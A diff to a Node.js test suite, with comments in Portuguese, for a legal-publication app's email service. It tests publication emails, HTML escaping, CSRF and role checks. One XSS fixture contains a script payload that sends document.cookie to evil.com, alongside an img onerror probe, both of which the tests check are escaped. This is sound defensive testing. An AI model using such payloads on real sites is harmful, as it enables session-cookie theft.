@@ -10,11 +10,11 @@ import { postJson, startTestServer } from './helpers.mjs';
 const ROOT = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
 
 console.log('\n===============================================================');
-console.log('  ATRIUM — SUÍTE DE TESTES: MOTOR SMTP E E-MAIL SEGURO');
+console.log('  ATRIUM — SUÍTE DE TESTES: MOTOR SMTP E ENVIO DE PUBLICAÇÃO');
 console.log('===============================================================\n');
 
 // 1. Testes Unitários do EmailService com Mock Transporter
-console.log('[1/3] Testando EmailService isolado (criptografia, validação e sanitização)...');
+console.log('[1/4] Testando EmailService isolado (criptografia, sanitização, XSS e templates)...');
 
 const mockSentMessages = [];
 const mockTransporter = {
@@ -86,6 +86,16 @@ try {
     'Deveria rejeitar e-mail de remetente inválido.'
   );
 
+  // Tentativa de envio de publicação com SMTP não configurado
+  await assert.rejects(
+    () => emailService.sendPublicationEmail({
+      recipient: 'cliente@exemplo.com.br',
+      publication: { id: 'pub-001', text: 'Texto de teste' }
+    }),
+    /A integração de e-mail ainda não foi configurada/,
+    'Deveria rejeitar envio de publicação se SMTP não estiver configurado.'
+  );
+
   // Teste de configuração com sucesso
   const configResult = await emailService.configure({
     host: 'smtp.escritorio.adv.br',
@@ -121,6 +131,82 @@ try {
   assert.equal(sentMsg.subject, 'ATRIUM — Teste de integração de e-mail', 'Assunto do e-mail de teste incorreto.');
   assert(sentMsg.text.includes('A integração de e-mail do Atrium está funcionando corretamente'), 'Corpo do texto incorreto.');
 
+  // Teste de envio de publicação com número de processo (Assunto dinâmico)
+  const pubWithProcess = {
+    id: 'pub-proc-100',
+    process: '5001234-56.2026.4.04.7105',
+    client: 'Empresa Teste de Serviços LTDA',
+    court: 'TRF4 — 1ª Vara Federal',
+    publishedAt: '2026-08-26',
+    source: 'DJEN Oficial',
+    term: 'Dr. Advogado Titular · OAB/RS 000000',
+    text: 'Intimação para manifestação sobre laudo contábil no prazo de 15 dias úteis. Conforme Art. 219 do CPC/2015 & decisão liminar.'
+  };
+
+  const pubResult = await emailService.sendPublicationEmail({
+    recipient: 'cliente@empresa.com.br',
+    publication: pubWithProcess
+  });
+  assert.equal(pubResult.ok, true, 'Envio de publicação deveria retornar ok: true.');
+  const sentPubMsg = mockSentMessages[mockSentMessages.length - 1];
+
+  assert.equal(sentPubMsg.to, 'cliente@empresa.com.br', 'Destinatário da publicação incorreto.');
+  assert.equal(sentPubMsg.subject, 'ATRIUM — Publicação judicial — 5001234-56.2026.4.04.7105', 'Assunto com processo incorreto.');
+  assert(sentPubMsg.text.includes('5001234-56.2026.4.04.7105'), 'Texto plano não contém processo.');
+  assert(sentPubMsg.text.includes('Empresa Teste de Serviços LTDA'), 'Texto plano não contém cliente.');
+  assert(sentPubMsg.text.includes('TRF4 — 1ª Vara Federal'), 'Texto plano não contém tribunal.');
+  assert(sentPubMsg.text.includes('26/08/2026') || sentPubMsg.text.includes('2026-08-26'), 'Texto plano não contém data.');
+  assert(sentPubMsg.text.includes('DJEN Oficial'), 'Texto plano não contém fonte.');
+  assert(sentPubMsg.text.includes('Art. 219 do CPC/2015 & decisão liminar.'), 'Texto plano não preservou conteúdo original.');
+  assert(sentPubMsg.text.includes('Esta mensagem foi enviada pelo ATRIUM'), 'Texto plano não contém rodapé de segurança.');
+
+  // Teste de envio de publicação SEM número de processo (Fallback do assunto)
+  const pubWithoutProcess = {
+    id: 'pub-no-proc-200',
+    client: 'Pessoa Sem Processo',
+    text: 'Despacho administrativo sem numeração judicial vinculada.'
+  };
+  await emailService.sendPublicationEmail({
+    recipient: 'contato@pessoa.com.br',
+    publication: pubWithoutProcess
+  });
+  const sentPubNoProc = mockSentMessages[mockSentMessages.length - 1];
+  assert.equal(sentPubNoProc.subject, 'ATRIUM — Nova publicação judicial', 'Fallback de assunto sem processo incorreto.');
+
+  // Teste de Segurança XSS e Escape HTML rigoroso
+  const maliciousPub = {
+    id: 'pub-xss-999',
+    process: '<script>alert("process-xss")</script>',
+    client: '<img src=x onerror=alert(1)>',
+    court: '<b>Tribunal Injetado</b>',
+    source: '"Fonte Injetada"',
+    term: '\'Termo Injetado\'',
+    text: 'Aviso importante: <script>document.location="http://evil.com/?c="+document.cookie</script> & <b>negrito</b> "aspas duplas" e \'aspas simples\'.'
+  };
+
+  await emailService.sendPublicationEmail({
+    recipient: 'seguranca@escritorio.adv.br',
+    publication: maliciousPub
+  });
+  const xssMail = mockSentMessages[mockSentMessages.length - 1];
+
+  // Nenhuma tag perigosa pode estar em texto puro no HTML
+  assert(!xssMail.html.includes('<script>'), 'HTML vazou tag <script>!');
+  assert(!xssMail.html.includes('<img'), 'HTML vazou tag <img>!');
+  assert(!xssMail.html.includes('<b>Tribunal Injetado</b>'), 'HTML vazou tag <b> não escapada no cabeçalho!');
+  assert(xssMail.html.includes('&lt;script&gt;alert(&quot;process-xss&quot;)&lt;/script&gt;'), 'XSS no processo não foi escapado.');
+  assert(xssMail.html.includes('&lt;img src=x onerror=alert(1)&gt;'), 'XSS no cliente não foi escapado.');
+  assert(xssMail.html.includes('&amp;'), '& não foi escapado como &amp;.');
+  assert(xssMail.html.includes('&quot;aspas duplas&quot;'), 'Aspas duplas não foram escapadas.');
+  assert(xssMail.html.includes('&#39;aspas simples&#39;'), 'Aspas simples não foram escapadas.');
+
+  // Teste de validação de destinatário na publicação
+  await assert.rejects(
+    () => emailService.sendPublicationEmail({ recipient: 'invalido', publication: pubWithProcess }),
+    /Informe um endereço de e-mail de destinatário válido/,
+    'Deveria rejeitar destinatário inválido no envio de publicação.'
+  );
+
   // Teste de erro amigável/higienizado em caso de falha SMTP
   const failingService = new EmailService({
     dataDirectory: unitTestDir,
@@ -144,13 +230,13 @@ try {
     'Deveria rejeitar com erro amigável sem expor segredos.'
   );
 
-  console.log('✓ EmailService isolado 100% aprovado.');
+  console.log('✓ EmailService isolado (Unit Tests, XSS, Templates e Criptografia) 100% aprovado.');
 } finally {
   await rm(unitTestDir, { recursive: true, force: true });
 }
 
 // 2. Testes de Integração HTTP via Servidor Real (Autenticação, RBAC e CSRF)
-console.log('\n[2/3] Testando endpoints HTTP de e-mail com autenticação e CSRF...');
+console.log('\n[2/4] Testando endpoints HTTP de e-mail com autenticação e CSRF...');
 
 const server = await startTestServer();
 const adminPassword = 'Senha-Segura-2026!';
@@ -166,6 +252,9 @@ try {
 
   res = await postJson(`${server.baseUrl}/api/integrations/email/test`, { recipient: 'test@test.com' });
   assert.equal(res.status, 401, 'Test de e-mail acessível sem autenticação!');
+
+  res = await postJson(`${server.baseUrl}/api/intimations/email`, { publicationId: 'pub-001', recipient: 'test@test.com' });
+  assert.equal(res.status, 401, 'Envio de publicação acessível sem autenticação!');
 
   // Setup do Administrador Principal (Master Admin)
   res = await postJson(`${server.baseUrl}/api/auth/setup`, { username: 'admin', displayName: 'Admin Titular', password: adminPassword });
@@ -198,6 +287,12 @@ try {
     recipient: 'destino@teste.com'
   }, { Cookie: adminCookie });
   assert.equal(res.status, 403, 'POST de teste de e-mail foi aceito sem token CSRF!');
+
+  res = await postJson(`${server.baseUrl}/api/intimations/email`, {
+    publicationId: 'pub-001',
+    recipient: 'destino@teste.com'
+  }, { Cookie: adminCookie });
+  assert.equal(res.status, 403, 'POST de envio de publicação foi aceito sem token CSRF!');
 
   // Cadastro e Aprovação de um Colaborador
   res = await postJson(`${server.baseUrl}/api/auth/register`, {
@@ -240,7 +335,7 @@ try {
   console.log('✓ Autenticação e CSRF validados.');
 
   // 3. Testes de Controle de Acesso Baseado em Função (RBAC)
-  console.log('\n[3/3] Testando autorização de e-mail por perfil (Admin vs Colaborador)...');
+  console.log('\n[3/4] Testando autorização de e-mail por perfil (Admin vs Colaborador)...');
 
   // COLABORADOR: GET status deve ser PERMITIDO (status higienizado)
   res = await fetch(`${server.baseUrl}/api/integrations/email/status`, { headers: { Cookie: collabCookie } });
@@ -276,6 +371,18 @@ try {
     'Mensagem de 403 do teste do colaborador incorreta.'
   );
 
+  // COLABORADOR: POST publication email + CSRF deve ser BLOQUEADO com 403
+  res = await postJson(`${server.baseUrl}/api/intimations/email`, {
+    publicationId: 'pub-001',
+    recipient: 'qualquer@destino.com'
+  }, { Cookie: collabCookie, 'X-CSRF-Token': collabCsrf });
+  assert.equal(res.status, 403, 'Colaborador conseguiu chamar POST /api/intimations/email!');
+  const collabPubErr = await res.json();
+  assert(
+    collabPubErr.message.includes('não possui permissão'),
+    'Mensagem de 403 do envio de publicação pelo colaborador incorreta.'
+  );
+
   // ADMIN: POST com parâmetros inválidos é autorizado pelo RBAC e chega na validação (400)
   res = await postJson(`${server.baseUrl}/api/integrations/email/configure`, {
     host: 'smtp.teste.com',
@@ -292,20 +399,101 @@ try {
   }, { Cookie: adminCookie, 'X-CSRF-Token': adminCsrf });
   assert.equal(res.status, 400, 'Admin deveria ter acesso autorizado e passar pela validação de formato.');
 
-  // Validação do Audit Log: garantir ausência de senhas
+  console.log('✓ Controle de acesso administrativo (Admin vs Colaborador) 100% verificado.');
+
+  // 4. Testes de Envio Manual de Publicação por E-mail (Fluxo Completo no Servidor)
+  console.log('\n[4/4] Testando fluxo de envio de publicação por e-mail no servidor real...');
+
+  // Adicionar uma publicação judicial legítima ao estado persistido
   res = await fetch(`${server.baseUrl}/api/state`, { headers: { Cookie: adminCookie } });
   const appStateData = await res.json();
-  const auditEntries = appStateData.state?.audit || [];
-  for (const entry of auditEntries) {
-    assert(!entry.detail?.includes('AppPassword123!'), 'A senha SMTP vazou no audit log!');
-    assert(!entry.detail?.includes('Segredo-Ultra-Secreto'), 'A senha SMTP vazou no audit log!');
+  const stateToUpdate = appStateData.state || {};
+  stateToUpdate.intimations = stateToUpdate.intimations || [];
+
+  const canonicalTestPublication = {
+    id: 'int-canon-777',
+    title: 'Intimação para Manifestação sobre Laudo Pericial',
+    process: '5002086-73.2022.4.04.7133',
+    client: 'Roberto Roque Junges',
+    court: 'TRF4 — 2ª Vara Federal de Novo Hamburgo',
+    publishedAt: '2026-08-26',
+    source: 'DJEN Oficial',
+    term: 'Dr. Advogado Titular · OAB/RS 000000',
+    text: 'Fica a parte autora intimada a apresentar manifestação circunstanciada sobre o laudo pericial médico no prazo de 15 (quinze) dias.',
+    status: 'nova',
+    unread: true,
+    createdAt: new Date().toISOString()
+  };
+  stateToUpdate.intimations.push(canonicalTestPublication);
+
+  res = await postJson(`${server.baseUrl}/api/state`, { state: stateToUpdate }, { Cookie: adminCookie, 'X-CSRF-Token': adminCsrf });
+  assert.equal(res.status, 200, 'Falha ao salvar estado inicial com intimação.');
+
+  // Tentativa de envio com publicação inexistente (deve retornar 404)
+  res = await postJson(`${server.baseUrl}/api/intimations/email`, {
+    publicationId: 'id-que-nao-existe-no-banco',
+    recipient: 'advogado@escritorio.adv.br'
+  }, { Cookie: adminCookie, 'X-CSRF-Token': adminCsrf });
+  assert.equal(res.status, 404, 'Deveria retornar 404 para publicação inexistente.');
+
+  // Tentativa de envio com destinatário inválido (deve retornar 400)
+  res = await postJson(`${server.baseUrl}/api/intimations/email`, {
+    publicationId: 'int-canon-777',
+    recipient: 'email-completamente-invalido'
+  }, { Cookie: adminCookie, 'X-CSRF-Token': adminCsrf });
+  assert.equal(res.status, 400, 'Deveria retornar 400 para destinatário inválido.');
+
+  // Configurar SMTP no servidor como Admin
+  res = await postJson(`${server.baseUrl}/api/integrations/email/configure`, {
+    host: 'smtp.servidor-teste.adv.br',
+    port: 465,
+    secure: true,
+    user: 'master@servidor-teste.adv.br',
+    password: 'Senha-Super-Secreta-12345!',
+    fromName: 'Escritório Keller & Associados',
+    fromAddress: 'notificacoes@servidor-teste.adv.br'
+  }, { Cookie: adminCookie, 'X-CSRF-Token': adminCsrf });
+  assert.equal(res.status, 200, 'Configuração SMTP pelo Admin falhou.');
+
+  // Envio de publicação via HTTP (com tentativa de injeção de subject, html ou text pelo cliente)
+  // O servidor DEVE ignorar subject/html/text enviados pelo cliente e processar a publicação canônica
+  res = await postJson(`${server.baseUrl}/api/intimations/email`, {
+    publicationId: 'int-canon-777',
+    recipient: 'cliente.roberto@gmail.com',
+    subject: 'ASSUNTO FORJADO PELO CLIENTE',
+    html: '<h1>CONTEUDO FORJADO PELO CLIENTE</h1>',
+    text: 'TEXTO FORJADO PELO CLIENTE'
+  }, { Cookie: adminCookie, 'X-CSRF-Token': adminCsrf });
+
+  assert.equal(res.status, 200, 'Envio de publicação falhou.');
+  const sendResp = await res.json();
+  assert.equal(sendResp.ok, true, 'Resposta não continha ok: true.');
+  assert(sendResp.message.includes('Publicação enviada com sucesso'), 'Mensagem de sucesso incorreta.');
+
+  // Validação de Imutabilidade da Intimação: Enviar e-mail NÃO altera status nem unread
+  res = await fetch(`${server.baseUrl}/api/state`, { headers: { Cookie: adminCookie } });
+  const postStateData = await res.json();
+  const refreshedPublication = (postStateData.state?.intimations || []).find(i => i.id === 'int-canon-777');
+  assert(refreshedPublication, 'Publicação sumiu do estado!');
+  assert.equal(refreshedPublication.status, 'nova', 'O status da intimação foi indevidamente alterado ao enviar e-mail!');
+  assert.equal(refreshedPublication.unread, true, 'A flag unread foi indevidamente alterada ao enviar e-mail!');
+
+  // Validação do Audit Log: Ação registrada com destinatário mascarado e sem senhas
+  const auditList = postStateData.state?.audit || [];
+  const emailAudit = auditList.find(a => a.action === 'Publicação enviada por e-mail');
+  assert(emailAudit, 'Auditoria de envio de publicação não encontrada!');
+  assert(emailAudit.detail.includes('cl***@gmail.com'), 'Destinatário no audit log não foi mascarado.');
+  assert(emailAudit.detail.includes('5002086-73.2022.4.04.7133') || emailAudit.detail.includes('int-canon-777'), 'Audit log não indicou a publicação.');
+
+  for (const entry of auditList) {
+    assert(!entry.detail?.includes('Senha-Super-Secreta-12345!'), 'Senha SMTP vazou no audit log!');
   }
 
-  console.log('✓ Controle de acesso administrativo (Admin vs Colaborador) 100% verificado.');
+  console.log('✓ Envio manual de publicação por e-mail 100% verificado no servidor real.');
 } finally {
   await server.stop();
 }
 
 console.log('\n===============================================================');
-console.log('  SUÍTE DE TESTES DE E-MAIL (SMTP & RBAC): 100% APROVADA!');
+console.log('  SUÍTE DE TESTES DE E-MAIL (SMTP, RBAC & PUBLICAÇÃO): 100% APROVADA!');
 console.log('===============================================================\n');
